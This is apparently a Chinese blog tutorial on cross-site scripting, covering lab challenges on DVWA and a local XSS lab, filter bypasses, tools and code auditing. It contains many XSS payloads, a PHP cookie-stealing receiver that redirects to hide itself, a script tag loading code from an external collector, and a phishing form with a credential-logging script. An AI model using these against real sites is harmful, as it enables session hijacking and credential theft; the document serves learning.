挑战十七\n\n```php+HTML\n//加载swf文件，并对两个参数arg01和arg02值进行过滤\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n```\n\n```shell\n//使用编码%0a、%0b绕过。\n`arg01=123&arg02= onmouseover=alert(1)`\n`arg01=123&arg02=%20onmousedown=alert`1``\n`arg01=123&arg02=  onmouseover=alert(1) type=\"text\"`\n``/level17.php?arg01=a&arg02=%20onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200828220707491](/images/XSS/image-20200828220707491.png)\n\n##### 挑战十八\n\n````php+HTML\n//和挑战十七的试题一致，可直接拿来利用测试\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n````\n\n```shell\n//使用编码%0a、%0b绕过。\n`arg01=123&arg02= onmouseover=alert(1)`\n`arg01=123&arg02=%20onmousedown=alert`1``\n`arg01=123&arg02=  onmouseover=alert(1) type=\"text\"`\n`/level17.php?arg01=a&arg02=%20onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200829095926257](/images/XSS/image-20200829095926257.png)\n\n##### 挑战十九\n\n````php+HTML\n//此题主要介绍考察Flash XSS\n<?php\nini_set(\"display_errors\", 0);\necho '<embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%>';\n?>\n````\n\n直接访问URL\n\n```\nhttp://xss-lab.me:8888/level19.php?arg01=a&arg02=b\n```\n\n![image-20200829104903728](/images/XSS/image-20200829104903728.png)\n\nswf文件直接输出参数值\n\n````shell\n//使用a标签加载javascript协议弹窗\n`/level19.php?arg01=version&arg02=<a href=\"javascript:alert('XSS')\">XSS_Click</a>`\n````\n\n![image-20200829105426617](/images/XSS/image-20200829105426617.png)\n\n点击触发漏洞\n\n`Result`\n\n![image-20200829105522767](/images/XSS/image-20200829105522767.png)\n\n##### 挑战二十\n\n```php+HTML\n//网络搜索未找到对应解析此题，只知道此题还是Flash XSS。\n<?php\nini_set(\"display_errors\", 0);\necho '<embed src=\"xsf04.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%>';\n?>\n```\n\n`payload`\n\n```shell\n//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；\n`level20.php?arg01=id&arg02=\\\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height`\n```\n\n`Result`\n\n![image-20200829135137358](/images/XSS/image-20200829135137358.png)\n\n参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。\n\n#### 存储型\n\n存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。\n\n存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。\n\n##### 搭建接收平台\n\n参考下面的`cookie.php`文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台[XSS_Top](https://webxss.top/)\n\n##### 实战\n\n###### DVWA-low\n\n看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。\n\n![image-20200831171126727](/images/XSS/image-20200831171126727.png)\n\n```php+HTML\nDVWA-Low\n<?php\nif( isset( $_POST[ 'btnSign' ] ) ) {\n\t// Get input\n\t$message = trim( $_POST[ 'mtxMessage' ] );\n\t$name    = trim( $_POST[ 'txtName' ] );\n\t// Sanitize message input\n\t$message = stripslashes( $message );\n\t$message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n\t// Sanitize name input\n\t$name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n\t// Update database\n\t$query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n\t//mysql_close();\n}\n?>\n```\n\n截获数据并修改Message的值\n\n![image-20200831171424381](/images/XSS/image-20200831171424381.png)\n\n接收平台此时会收到Cookie值\n\n![image-20200831171401476](/images/XSS/image-20200831171401476.png)\n\n浏览器插件添加Cookie值并绕过登录\n\n![image-20200831173056272](/images/XSS/image-20200831173056272.png)\n\n接收Cookie的php文件\n\n```php+HTML\n<?php\n\n$cookie = $_GET['cookie']; //以GET方式获取cookie变量值\n$ip = getenv ('REMOTE_ADDR'); //远程主机IP地址\n$time=date('Y-m-d g:i:s'); //以“年-月-日 时：分：秒”的格式显示时间\n$referer=getenv ('HTTP_REFERER'); //链接来源\n$agent = $_SERVER['HTTP_USER_AGENT']; //用户浏览器类型\n\n$fp = fopen('cookie.txt', 'a'); //打开cookie.txt，若不存在则创建它\nfwrite($fp,\" IP: \" .$ip. \"\\n Date and Time: \" .$time. \"\\n User Agent:\".$agent.\"\\n Referer: \".$referer.\"\\n Cookie: \".$cookie.\"\\n\\n\\n\"); //写入文件\nfclose($fp); //关闭文件\n\nheader(\"Location: http://www.baidu.com\")//重定向到baidu，防止发现\n?>\n```\n\n直接访问生成cookie.txt文件\n\n![image-20200831183628978](/images/XSS/image-20200831183628978.png)\n\n###### DVWA-Medium\n\n中级和低级比较显示使用部分函数进行过滤。\n\n```php\naddslashes()\t\t\t\t使用反斜线引用字符串\nhtmlspecialchars()\t将特殊字符转换为 HTML 实体\nstr_replace()\t\t\t\t子字符串替换\n```\n\n![image-20200901112252053](/images/XSS/image-20200901112252053.png)\n\n抓包绕过\n\n```shell\n`<sc<script>ript>alert(/xss/)</script>`\n大小写绕过\n`<Script>alert(/xss/)</script>`\n`</textarea>'\"><Script src=https://webxss.top/xss/BjE4XZ?1598931992></script>`\n```\n\n弹窗检测\n\n![image-20200901134156567](/images/XSS/image-20200901134156567.png)\n\n![image-20200901134205736](/images/XSS/image-20200901134205736.png)\n\n```shell\n`<img src=1 οnerrοr=alert(1)>`\n```\n\n###### DVWA-high\n\n高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等\n\n![image-20200901135011353](/images/XSS/image-20200901135011353.png)\n\n```html\n`<img src=1 onerror=alert(1)>`\n```\n\n![image-20200901140548264](/images/XSS/image-20200901140548264.png)\n\n![image-20200901140610422](/images/XSS/image-20200901140610422.png)\n\n#### DOM型\n\n##### DVWA-low\n\nlow版本不存在任何显示，default参数值设置为payload。\n\n```php+HTML\n<?php\n# No protections, anything goes\n?>\n```\n\n![image-20200901142115894](/images/XSS/image-20200901142115894.png)\n\n```shell\n`<option value=\"%3Cscript%3Ealert(%27xss%27)%3C/script%3E\"><script>alert('xss')</script>\n</option>`\n# script标签及值放在option标签内<dom树执行结果>\n```\n\n##### DVWA-Medium\n\n中级出现了对值<script进行判断\n\n```php+HTML\n<?php\n\n// Is there any input?\nif ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) {\n\t$default = $_GET['default'];\n\t\n\t# Do not allow script tags\n\tif (stripos ($default, \"<script\") !== false) {\n\t\theader (\"location: ?default=English\");\n\t\texit;\n\t}\n}\n?>\n```\n\n```shell\n# 此时使用`<img src=1 onerror=alert(1)>`\n# 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。\n```\n\n![image-20200901145238002](/images/XSS/image-20200901145238002.png)\n\n构造语句闭合option标签：\n\n```shell\n`></option><img src=1 onerror=alert(1)>`\n```\n\n![image-20200901145626304](/images/XSS/image-20200901145626304.png)\n\n\\> 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签\n\n```shell\n# 完成标签闭合完成\n`></option></select><img src=1 onerror=alert('xss')>`\n```\n\n![image-20200901145826892](/images/XSS/image-20200901145826892.png)\n\n##### DVWA-High\n\n先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。\n\n### Tools\n\n#### 黑盒测试\n\n##### AWVS\n\n![image-20200831112823669](/images/XSS/image-20200831112823669.png)\n\n一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。\n\n目前最新版本已经AWVS 13支持Web端配置如上图所示\n\n##### BruteXSS\n\n[项目地址](https://github.com/rajeshmajumdar/BruteXSS.git)\n\n![image-20200831111313145](/images/XSS/image-20200831111313145.png)\n\nBruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。\n\n**特点**\n\n1. XSS 爆破\n2. XSS 扫描\n3. GET/POST 请求\n4. 可包含自定义单词\n5. 人性化的 UI\n\n其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。\n\n##### BeEF\n\nBeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。\n\n![logo](/images/XSS/logo.png)\n\n参考另一篇BeEF使用。\n\n#### 白盒测试\n\n关于XSS的代码审计主要就是从`接收参数`和`输出函数`及一些关键词入手。\n\nPHP中常见`接收参数`的方式有：`$_GET`、`$_POST`、`$_REQUEST`等等，\n\nPHP中常见`输出函数`的方式有：`print`，`print_r`，`echo`，`printf`，`sprintf`，`die`，`var_dump`，`var_export`\n\n可以搜索`接收参数`的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。\n\n也可以搜索`输出函数`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。\n\n大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。\n\nDOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。\n\n### Bypass\n\n汇总部分绕过xss过滤方式，更多可搜“`XSS Filter Evasion Cheat Sheet_SecPulse`”一份专门介绍XSS的绕过。\n\n#### 大小写\n\n```shell\n`<ScRIpT>alert('XSS')</sCRIpT>`\n```\n\n#### 编码\n\n```shell\n1、十六进制编码\n2、jsfuck编码\n3、url编码\n4、unicode编码等\n5、`<0x736372697074>alert('123')</0x736372697074>`\n6、`<img src=\"1\" onerror=\"alert&#x28;1&#x29;\">`\n```\n\n#### magic_quotes_gpc\n\n```shell\n//绕过可参考以下\n`<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>`\n```\n\n#### 标签\n\n##### 闭合\n\n```shell\n//查看源码输出位置是否存在标签未闭合情况来进行绕过\n`\"><script>alert(/123/)</script>`\n`</script><script>alert(1)</script>`\n```\n\n##### 其它标签\n\n```shell\n//使用较多方式是通过报错形式来添加标签进行绕过\n`<img src=\"x\" onerror=\"alert('XSS')\">`\n`<button onclick=\"javascript:alert('XSS')>XSS</button\">`\n`<title><img a=\"</title><img/src=1 onerror=alert(1)//\">`\n`\"onsubmit=javascript:alert(1)%20name=\"a`\n`<details open ontoggle=\"eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))\">`\n`<video src=\"http://www.0dutv.com/plug/down/up2.php/104678898.mp3\" onprogress=('body').perpend(123);('body')></video>`\n```\n\n#### 替换\n\n| 符号 | 替换     |\n| ---- | -------- |\n| %0a  | 替换空格 |\n| %d   | 替换空格 |\n| /**/ | 替换空格 |\n| %00  | 截断     |\n| ``   | 替换括号 |\n\n#### 重复绕过\n\n```shell\n//对部分字符过滤及替换时，采用重复形式进行绕过\n`<img ononerrorerror=\"123\">`\n`<script>alalertert(123)</script>`\n```\n\n#### 宽子节绕过\n\n`GB系列`编码，尝试宽字节字符：\n\n `%c0`、`%bf`、`%5c`、`%df`\n\n#### 事件属性\n\n| 属性        | 解析                           |\n| ----------- | ------------------------------ |\n| onclick     | 鼠标点击事件                   |\n| onerror     | 当加载文档或图像时发生某个错误 |\n| onload      | 某个页面或图像被完成加载       |\n| onmousemove | 鼠标被移动                     |\n| 等其它事件  |                                |\n\n#### 长度限制\n\ninput标签中有maxlength限制传参长度，抓包修改发送数据。\n\n#### PHP部分函数\n\nphp内包含部分过滤及转义函数及绕过方式统计\n\n| 序号 | PHP函数        | 函数解析                   | 绕过                                                         |\n| ---- | -------------- | -------------------------- | ------------------------------------------------------------ |\n| 1    | str_replace()  | 该函数区分大小写           | 使用大小写进行绕过                                           |\n| 2    | str_ireplace() | 该函数不区分大小写         | 双写绕过，如：<scscriptirpt>                                 |\n| 3    | preg_replace() | 正则表达式的搜索和替换     | 使用html标签事件绕过，如：`<img src=xx onerror=alert(1)>`    |\n| 4    | htmlentities() | 将字符转换为 HTML 转义字符 | htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS |\n\n### 修复建议\n\n不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；\n\n<center>学习～</center>\n### 参考\n\n```html\n//反射型挑战解析\nhttps://my.oschina.net/u/4332632/blog/3374751\nhttps://www.cnblogs.com/bmjoker/p/9446472.html\nbypass姿势\nhttps://owasp.org/www-community/xss-filter-evasion-cheatsheet\nhttps://xz.aliyun.com/t/1678/\n```\n","slug":"XSS学习","published":1,"updated":"2020-10-23T03:39:51.224Z","_id":"ckglobheq0014b1hqh5du2pvr","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h3><p>XSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示”跨站脚本攻击”。</p>\n<p>之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何<code>验证</code>、<code>影响范围</code>及<code>修复</code>需要我们慢慢学习整理。</p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。</p>\n<p>本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。</p>\n<h4 id=\"产生过程\"><a href=\"#产生过程\" class=\"headerlink\" title=\"产生过程\"></a>产生过程</h4><h5 id=\"反射型-非持久性\"><a href=\"#反射型-非持久性\" class=\"headerlink\" title=\"反射型(非持久性)\"></a>反射型(非持久性)</h5><ol>\n<li>攻击者构造出特殊代码，其中包含恶意代码</li>\n<li>用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器</li>\n<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警</li>\n</ol>\n<h5 id=\"存储型-持久性\"><a href=\"#存储型-持久性\" class=\"headerlink\" title=\"存储型(持久性)\"></a>存储型(持久性)</h5><ol>\n<li>攻击者准备好接收Cookie平台</li>\n<li>攻击者找到目标系统可留言、修改个人信息处</li>\n<li>插入恶意代码及链接</li>\n<li>管理员登录系统并对留言信息点击后会触发XSS漏洞</li>\n<li>会把管理员登录的Cookie发送到接收平台</li>\n<li>攻击者替换Cookie值进行访问，此时权限会提升至管理员</li>\n</ol>\n<h5 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h5><ol>\n<li>攻击者构造Javascript或其他脚本</li>\n<li>插入到指定位置(URL参数、其他个人信息或其他可修改位置)</li>\n<li>点击触发漏洞，构造的恶意代码被执行</li>\n<li>结果：可能会弹窗或其他操作</li>\n</ol>\n<h4 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h4><p>由以上了解，漏洞可按照以下形式进行分类：</p>\n<h5 id=\"一、非持久型-反射型、DOM型\"><a href=\"#一、非持久型-反射型、DOM型\" class=\"headerlink\" title=\"一、非持久型(反射型、DOM型)\"></a>一、非持久型(反射型、DOM型)</h5><p>指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。</p>\n<h5 id=\"二、持久型-存储型\"><a href=\"#二、持久型-存储型\" class=\"headerlink\" title=\"二、持久型(存储型)\"></a>二、持久型(存储型)</h5><p>指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。</p>\n<h3 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h3><p>值得推荐的本地漏洞环境可参考如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DVWA:https:&#x2F;&#x2F;github.com&#x2F;digininja&#x2F;DVWA.git</span><br><span class=\"line\">本地搭建XSS:https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;54041627</span><br><span class=\"line\">bwapp:http:&#x2F;&#x2F;www.itsecgames.com&#x2F;</span><br><span class=\"line\">其他环境待更新...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"在线挑战\"><a href=\"#在线挑战\" class=\"headerlink\" title=\"在线挑战\"></a>在线挑战</h3><p>值得推荐的线上挑战赛：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2296</span><br><span class=\"line\">https:&#x2F;&#x2F;xss-quiz.int21h.jp&#x2F;</span><br><span class=\"line\">其他环境待更新...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h3><p>按不同类型分析对目标系统会产生哪些影响范围</p>\n<h4 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h4><p>Cookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）</p>\n<p>XSS History Hack(利用：getComputedStyle()方法)</p>\n<h4 id=\"存储型\"><a href=\"#存储型\" class=\"headerlink\" title=\"存储型\"></a>存储型</h4><p>Cookie欺骗/Cookie会话攻击</p>\n<p>会话劫持(Session/Cookie)</p>\n<p>网络钓鱼</p>\n<p>钓鱼脚本</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://xss-lab.me:8888/get.php&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;test&quot;</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Pass&quot;</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;login&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>记录信息</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data =fopen(<span class=\"string\">&#x27;login.txt&#x27;</span>,<span class=\"string\">&quot;a+&quot;</span>);</span><br><span class=\"line\">$login = $_POST[<span class=\"string\">&quot;username&quot;</span>];</span><br><span class=\"line\">$pass = $_POST[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\">fwrite($data,<span class=\"string\">&quot;username:<span class=\"subst\">$login</span>\\n&quot;</span>);</span><br><span class=\"line\">fwrite($data,<span class=\"string\">&quot;password:<span class=\"subst\">$pass</span>\\n&quot;</span>);</span><br><span class=\"line\">fclose($data);</span><br><span class=\"line\">Header(<span class=\"string\">&quot;location:login.html&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>下图记录用户提交请求</p>\n<p><img src=\"/images/XSS/image-20200828105754440.png\" alt=\"image-20200828105754440\"></p>\n<p>网页挂马(网页内嵌入script、或iframe等标签)</p>\n<p>DOS或DDOS</p>\n<h4 id=\"DOM型-1\"><a href=\"#DOM型-1\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h4><p>DOM型和反射型XSS类似因此不再重复写</p>\n<h3 id=\"实战验证\"><a href=\"#实战验证\" class=\"headerlink\" title=\"实战验证\"></a>实战验证</h3><h4 id=\"反射型-1\"><a href=\"#反射型-1\" class=\"headerlink\" title=\"反射型\"></a>反射型</h4><p>反射型XSS使用网络检索得到一款源码搭建本地测试，反射型<code>payload</code></p>\n<h5 id=\"挑战一\"><a href=\"#挑战一\" class=\"headerlink\" title=\"挑战一\"></a>挑战一</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//未编码</span><br><span class=\"line\">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">//外部输入变量</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;name&quot;</span>];</span></span><br><span class=\"line\">//变量值未经过滤直接输出</span><br><span class=\"line\">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828134439412.png\" alt=\"image-20200828134439412\"></p>\n<h5 id=\"挑战二\"><a href=\"#挑战二\" class=\"headerlink\" title=\"挑战二\"></a>挑战二</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初步测试,发现payload直接输出</span><br><span class=\"line\">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828140956492.png\" alt=\"image-20200828140956492\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//满足闭合,观察输入payload时输出</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对变量经过htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_et(&quot;display_errors&quot;, 0);</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span></span><br><span class=\"line\">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class=\"line\">&lt;form action=level2.php method=GET&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class=\"line\">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span 